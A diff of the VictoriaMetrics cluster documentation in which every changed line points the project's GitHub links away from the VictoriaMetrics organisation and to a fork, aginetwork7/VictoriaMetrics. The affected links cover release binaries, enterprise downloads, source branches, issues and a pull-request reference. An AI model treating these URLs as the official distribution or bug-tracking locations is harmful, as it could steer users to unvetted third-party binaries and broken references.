@@ -12,7 +12,7 @@ aliases:
 
 VictoriaMetrics is a fast, cost-effective and scalable time series database. It can be used as a long-term remote storage for Prometheus.
 
-It is recommended to use the [single-node version](https://github.com/VictoriaMetrics/VictoriaMetrics) instead of the cluster version
+It is recommended to use the [single-node version](https://github.com/aginetwork7/VictoriaMetrics) instead of the cluster version
 for ingestion rates lower than a million data points per second.
 The single-node version [scales perfectly](https://medium.com/@valyala/measuring-vertical-scalability-for-time-series-databases-in-google-cloud-92550d78d8ae)
 with the number of CPU cores, RAM and available storage space.
@@ -27,7 +27,7 @@ you can join it via [Slack Inviter](https://slack.victoriametrics.com/).
 [Contact us](mailto:info@victoriametrics.com) if you need enterprise support for VictoriaMetrics. 
 See [features available in enterprise package](https://docs.victoriametrics.com/enterprise/).
 Enterprise binaries can be downloaded and evaluated for free 
-from [the releases page](https://github.com/VictoriaMetrics/VictoriaMetrics/releases/latest).
+from [the releases page](https://github.com/aginetwork7/VictoriaMetrics/releases/latest).
 See how to request a free trial license [here](https://victoriametrics.com/products/enterprise/trial/).
 
 VictoriaMetrics is developed at a fast pace, so it is recommended periodically checking the [CHANGELOG](https://docs.victoriametrics.com/changelog/) and performing [regular upgrades](#how-to-upgrade-victoriametrics).
@@ -36,7 +36,7 @@ VictoriaMetrics has achieved security certifications for Database Software Devel
 
 ## Prominent features
 
-- Supports all the features of the [single-node version](https://github.com/VictoriaMetrics/VictoriaMetrics).
+- Supports all the features of the [single-node version](https://github.com/aginetwork7/VictoriaMetrics).
 - Performance and capacity scale horizontally. See [these docs for details](#cluster-resizing-and-scalability).
 - Supports multiple independent namespaces for time series data (aka multi-tenancy). See [these docs for details](#multitenancy).
 - Supports replication. See [these docs for details](#replication-and-data-safety).
@@ -164,7 +164,7 @@ since untrusted source may break per-tenant data by writing unwanted samples or 
 
 ## Binaries
 
-Compiled binaries for the cluster version are available in the `assets` section of the [releases page](https://github.com/VictoriaMetrics/VictoriaMetrics/releases/latest).
+Compiled binaries for the cluster version are available in the `assets` section of the [releases page](https://github.com/aginetwork7/VictoriaMetrics/releases/latest).
 Also see archives containing the word `cluster`.
 
 Docker images for the cluster version are available here:
@@ -175,7 +175,7 @@ Docker images for the cluster version are available here:
 
 ## Building from sources
 
-The source code for the cluster version is available in the [cluster branch](https://github.com/VictoriaMetrics/VictoriaMetrics/tree/cluster).
+The source code for the cluster version is available in the [cluster branch](https://github.com/aginetwork7/VictoriaMetrics/tree/cluster).
 
 ### Production builds
 
@@ -201,7 +201,7 @@ vmstorage-prod
 ### Development Builds
 
 1. [Install go](https://golang.org/doc/install). The minimum supported version is Go 1.22.
-1. Run `make` from [the repository root](https://github.com/VictoriaMetrics/VictoriaMetrics). It should build `vmstorage`, `vmselect`
+1. Run `make` from [the repository root](https://github.com/aginetwork7/VictoriaMetrics). It should build `vmstorage`, `vmselect`
    and `vminsert` binaries and put them into the `bin` folder.
 
 ### Building docker images
@@ -212,7 +212,7 @@ Run `make package`. It will build the following docker images locally:
 - `victoriametrics/vmselect:<PKG_TAG>`
 - `victoriametrics/vmstorage:<PKG_TAG>`
 
-`<PKG_TAG>` is auto-generated image tag, which depends on source code in [the repository](https://github.com/VictoriaMetrics/VictoriaMetrics).
+`<PKG_TAG>` is auto-generated image tag, which depends on source code in [the repository](https://github.com/aginetwork7/VictoriaMetrics).
 The `<PKG_TAG>` may be manually set via `PKG_TAG=foobar make package`.
 
 By default, images are built on top of [alpine](https://hub.docker.com/_/scratch) image in order to improve debuggability.
@@ -251,7 +251,7 @@ Ports may be altered by setting `-httpListenAddr` on the corresponding nodes.
 It is recommended setting up [monitoring](#monitoring) for the cluster.
 
 The following tools can simplify cluster setup:
-- [An example docker-compose config for VictoriaMetrics cluster](https://github.com/VictoriaMetrics/VictoriaMetrics/blob/master/deployment/docker/docker-compose-cluster.yml)
+- [An example docker-compose config for VictoriaMetrics cluster](https://github.com/aginetwork7/VictoriaMetrics/blob/master/deployment/docker/docker-compose-cluster.yml)
 - [Helm charts for VictoriaMetrics](https://github.com/VictoriaMetrics/helm-charts)
 - [Kubernetes operator for VictoriaMetrics](https://github.com/VictoriaMetrics/operator)
 
@@ -352,7 +352,7 @@ When `vmselect` runs with `-clusternativeListenAddr` command-line option, then i
 
 See [these docs](https://gist.github.com/f41gh7/76ed8e5fb1ebb9737fe746bae9175ee6) on how to set up mTLS in VictoriaMetrics cluster.
 
-[Enterprise version of VictoriaMetrics](https://docs.victoriametrics.com/enterprise/) can be downloaded and evaluated for free from [the releases page](https://github.com/VictoriaMetrics/VictoriaMetrics/releases/latest).
+[Enterprise version of VictoriaMetrics](https://docs.victoriametrics.com/enterprise/) can be downloaded and evaluated for free from [the releases page](https://github.com/aginetwork7/VictoriaMetrics/releases/latest).
 See how to request a free trial license [here](https://victoriametrics.com/products/enterprise/trial/).
 
 ## Monitoring
@@ -374,7 +374,7 @@ If you use Google Cloud Managed Prometheus for scraping metrics from VictoriaMet
 command-line to them, so they add `TYPE` and `HELP` comments per each exposed metric at `/metrics` page.
 See [these docs](https://cloud.google.com/stackdriver/docs/managed-prometheus/troubleshooting#missing-metric-type) for details.
 
-It is recommended setting up alerts in [vmalert](https://docs.victoriametrics.com/vmalert/) or in Prometheus from [this list](https://github.com/VictoriaMetrics/VictoriaMetrics/tree/master/deployment/docker#alerts).
+It is recommended setting up alerts in [vmalert](https://docs.victoriametrics.com/vmalert/) or in Prometheus from [this list](https://github.com/aginetwork7/VictoriaMetrics/tree/master/deployment/docker#alerts).
 See more details in the article [VictoriaMetrics Monitoring](https://victoriametrics.com/blog/victoriametrics-monitoring/).
 
 ## Cardinality limiter
@@ -990,7 +990,7 @@ For example, the following config sets retention to 5 days for time series with 
 See also [these docs](https://docs.victoriametrics.com/#retention-filters) for additional details on retention filters.
 See also [downsampling](#downsampling).
 
-Enterprise binaries can be downloaded and evaluated for free from [the releases page](https://github.com/VictoriaMetrics/VictoriaMetrics/releases/latest).
+Enterprise binaries can be downloaded and evaluated for free from [the releases page](https://github.com/aginetwork7/VictoriaMetrics/releases/latest).
 See how to request a free trial license [here](https://victoriametrics.com/products/enterprise/trial/).
 
 ## Downsampling
@@ -1023,7 +1023,7 @@ then query results can be less consistent because of mixing raw and downsampled 
 
 See also [retention filters](#retention-filters).
 
-Enterprise binaries can be downloaded and evaluated for free from [the releases page](https://github.com/VictoriaMetrics/VictoriaMetrics/releases/latest).
+Enterprise binaries can be downloaded and evaluated for free from [the releases page](https://github.com/aginetwork7/VictoriaMetrics/releases/latest).
 See how to request a free trial license [here](https://victoriametrics.com/products/enterprise/trial/).
 
 ## Profiling
@@ -1079,7 +1079,7 @@ If you like VictoriaMetrics and want contributing, then please read [these docs]
 
 ## Reporting bugs
 
-Report bugs and propose new features [here](https://github.com/VictoriaMetrics/VictoriaMetrics/issues).
+Report bugs and propose new features [here](https://github.com/aginetwork7/VictoriaMetrics/issues).
 
 ## List of command-line flags
 
@@ -1646,7 +1646,7 @@ Below is the output for `/path/to/vmselect -help`:
   -search.skipSlowReplicas
      Whether to skip -replicationFactor - 1 slowest vmstorage nodes during querying. Enabling this setting may improve query speed, but it could also lead to incomplete results if some queried data has less than -replicationFactor copies at vmstorage nodes. Consider enabling this setting only if all the queried data contains -replicationFactor copies in the cluster
   -search.inmemoryBufSizeBytes size
-     Size for in-memory data blocks used during processing search requests. By default, the size is automatically calculated based on available memory. Adjust this flag value if you observe that vm_tmp_blocks_max_inmemory_file_size_bytes metric constantly shows much higher values than vm_tmp_blocks_inmemory_file_size_bytes. See https://github.com/VictoriaMetrics/VictoriaMetrics/pull/6851
+     Size for in-memory data blocks used during processing search requests. By default, the size is automatically calculated based on available memory. Adjust this flag value if you observe that vm_tmp_blocks_max_inmemory_file_size_bytes metric constantly shows much higher values than vm_tmp_blocks_inmemory_file_size_bytes. See https://github.com/aginetwork7/VictoriaMetrics/pull/6851
      Supports the following optional suffixes for size values: KB, MB, GB, TB, KiB, MiB, GiB, TiB (default 0)
   -search.tenantCacheExpireDuration duration
      The expiry duration for list of tenants for multi-tenant queries. (default 5m0s)
@@ -1701,7 +1701,7 @@ Below is the output for `/path/to/vmselect -help`:
   -vmstorageUserTimeout duration
      Network timeout for RPC connections from vmselect to vmstorage (Linux only). Lower values reduce the maximum query durations when some vmstorage nodes become unavailable because of networking issues. Read more about TCP_USER_TIMEOUT at https://blog.cloudflare.com/when-tcp-sockets-refuse-to-die/ . See also -vmstorageDialTimeout (default 3s)
   -vmui.customDashboardsPath string
-     Optional path to vmui dashboards. See https://github.com/VictoriaMetrics/VictoriaMetrics/tree/master/app/vmui/packages/vmui/public/dashboards
+     Optional path to vmui dashboards. See https://github.com/aginetwork7/VictoriaMetrics/tree/master/app/vmui/packages/vmui/public/dashboards
   -vmui.defaultTimezone string
      The default timezone to be used in vmui. Timezone must be a valid IANA Time Zone. For example: America/New_York, Europe/Berlin, Etc/GMT+3 or Local
 ```
